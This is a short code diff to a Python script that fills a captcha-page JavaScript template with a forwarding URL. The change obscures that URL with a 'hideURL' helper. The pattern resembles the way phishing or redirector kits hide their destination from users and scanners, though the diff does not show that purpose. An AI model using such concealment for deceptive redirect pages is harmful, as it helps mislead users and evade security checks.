@@ -22,7 +22,7 @@ else:
 
 with open('template/captcha/js/main_temp.js', 'r') as location_temp:
     js_file = location_temp.read()
-    updated_js_raw = js_file.replace('REDIRECT_URL', real_forward)
+    updated_js_raw = js_file.replace('REDIRECT_URL', utils.hideURL(real_forward))
 
 with open('template/captcha/js/main.js', 'w') as updated_js:
     updated_js.write(updated_js_raw)
